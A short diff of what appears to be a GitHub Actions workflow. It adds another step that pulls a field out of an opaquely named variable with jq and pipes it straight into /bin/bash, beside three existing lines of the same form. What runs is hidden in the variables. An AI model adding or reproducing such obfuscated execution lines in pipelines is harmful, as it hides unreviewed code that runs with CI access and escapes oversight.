@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$h5512" | jq -r .ftum7774 | /bin/bash
           echo $dn787 | jq -r .i202 | /bin/bash
           printf '%s' "$r45" | jq -r .h3 | /bin/bash
+          echo $gu8270 | jq -r .rcp2146 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
